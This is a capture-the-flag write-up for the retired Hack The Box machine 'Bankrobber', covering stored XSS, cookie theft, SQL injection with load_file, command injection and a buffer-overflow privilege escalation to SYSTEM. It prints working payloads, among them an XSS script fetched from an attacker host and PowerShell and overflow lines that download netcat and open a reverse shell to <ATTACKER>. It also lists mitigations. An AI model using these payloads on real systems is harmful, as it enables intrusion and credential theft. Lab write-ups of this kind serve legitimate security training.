---
machine: Bankrobber
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, web, xss, sqli, buffer-overflow, privesc]
---

# Bankrobber — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site allows registration and balance transfers with a comment. XSS in that field reaches the administrator's browser and leaks base64 cookies; they open `/admin/`, where SQLi reads files and the source of `backdoorchecker.php`. On the host, `bankv2.exe` listens on 910, checks a four-digit PIN and overflows the executable name it launches, allowing a SYSTEM shell.

## Recon

```bash
nmap -Pn -sCV -p80,443,445,3306 <IP>
```

- `80/443` serve a PHP banking application; `445` SMB and `3306` MySQL also respond.
- `gobuster` finds `/admin/` and `/user/`; the admin panel requires a privileged session.
- Registration is open and the transfer form accepts a free-text comment.

## Enumeration

- The `username` and `password` cookies are unsigned base64 of the username and password.
- The comment field is rendered in the administrator's panel, which reviews transfers with a headless browser.
- `backdoorchecker.php` only accepts `dir` and only from `::1`, but its source can be read with SQLi.

## Foothold

Inject a script in the comment that sends `document.cookie` to the attacker. When the administrator reviews the transfer, the cookies arrive; decode and reuse them on `/admin/`.

```html
<script src="http://<ATTACKER>/cookie.js"></script>
```

```bash
curl -s 'http://<IP>/admin/search.php' --data-urlencode "term=1' UNION SELECT 1,load_file('C:/xampp/htdocs/admin/backdoorchecker.php'),3-- -"
```

SQLi reveals that `backdoorchecker.php` runs `system()` but only accepts requests from `::1`. Reuse the XSS so the administrator sends the POST from the host itself and downloads `nc64.exe`; the response is a shell as `cortin`.

```javascript
var params = 'cmd=dir|powershell -c "iwr -uri http://<ATTACKER>/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe <ATTACKER> 443';
```

## Lateral movement

The panel confirms the webroot is `C:\xampp\htdocs` and that the administrator runs PhantomJS periodically. Local enumeration finds `C:\bankv2.exe` and port 910, which the initial scan missed.

```cmd
netstat -ano | findstr LISTENING
tasklist | findstr bankv2
```

## Privilege escalation

`bankv2.exe` asks for a four-digit PIN and then the amount. The amount is copied into a string used as the transfer executable name; 32 bytes of padding replace it with `nc.exe` and yield SYSTEM.

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe <ATTACKER> 443
```

## Evidence

- XSS comment and request carrying the administrator cookies.
- `username=admin` cookie and access to `/admin/`.
- SQLi with `load_file` against `backdoorchecker.php`.
- `bankv2.exe` on 910 and overflow of the executable name.

## Lessons learned

- Stored XSS in a review panel can compromise an administrative account.
- Storing credentials in base64 cookies is equivalent to sending them in clear.
- A forgotten local service can be the shortest escalation path.

## Mitigation and detection

- Use `HttpOnly`, `Secure` and server-side signed sessions.
- Parameterize queries and disallow `load_file` and `INTO OUTFILE`.
- Review localhost binaries and services; validate argument lengths.

## References

- [0xdf — Bankrobber](https://0xdf.gitlab.io/2020/03/07/htb-bankrobber.html)
- [IppSec — Bankrobber](https://www.youtube.com/watch?v=zYmA9ECuCio)
- [Hack The Box — Bankrobber](https://app.hackthebox.com/machines/bankrobber)
